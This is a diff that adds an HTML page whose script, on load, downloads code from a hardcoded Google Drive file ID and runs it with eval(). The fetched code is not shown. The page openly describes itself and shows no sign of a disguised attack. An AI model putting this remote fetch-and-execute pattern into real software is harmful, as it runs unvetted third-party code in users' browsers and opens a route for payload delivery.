@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Run Code from Google Drive</title>
+</head>
+<body>
+    <h1>Executing Drive Code...</h1>
+    <div id="status">Fetching script...</div>
+
+    <script>
+        async function runCodeFromDrive(fileId) {
+            // This is the direct download URL format for public Google Drive files
+            const url = `https://docs.google.com/uc?export=download&id=${fileId}`;
+            
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error('Network response was not ok');
+                
+                const code = await response.text();
+                
+                // Method 1: Execute using eval()
+                eval(code);
+                
+                // Method 2: Execute by appending a script tag (cleaner for debugging)
+                // const script = document.createElement('script');
+                // script.textContent = code;
+                // document.body.appendChild(script);
+
+                document.getElementById('status').innerText = "Code executed successfully!";
+            } catch (error) {
+                console.error("Error fetching or executing code:", error);
+                document.getElementById('status').innerText = "Error: See console for details.";
+            }
+        }
+
+        // Use your specific File ID here
+        const myFileId = '1yKXNZVyxdeLiqxvkTzAcWlyDDrZuhoY_';
+        runCodeFromDrive(myFileId);
+    </script>
+</body>
+</html>
